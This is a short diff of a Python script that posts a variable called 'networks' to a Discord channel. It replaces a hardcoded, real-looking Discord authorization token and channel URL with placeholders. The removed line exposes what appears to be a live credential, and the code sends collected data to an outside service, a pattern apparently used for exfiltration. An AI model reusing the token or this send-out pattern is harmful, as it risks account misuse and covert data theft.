@@ -16,10 +16,10 @@ for i in a:
             payload = {'content': networks}
             header = {
                 'authorization':
-                'NjcwNjkyODE5NTgwNjE2Nzc0.G_XgIs.jf-Ixb_zRa6Nfz-7gcspRlXo048wJ1GfXfUI80'
+                'put your authorisation code here'
 }
             r = requests.post(
-                "https://discord.com/api/v9/channels/897222647325274152/messages",
+                "link to discord channel",
                 data=payload,
                 headers=header)
 
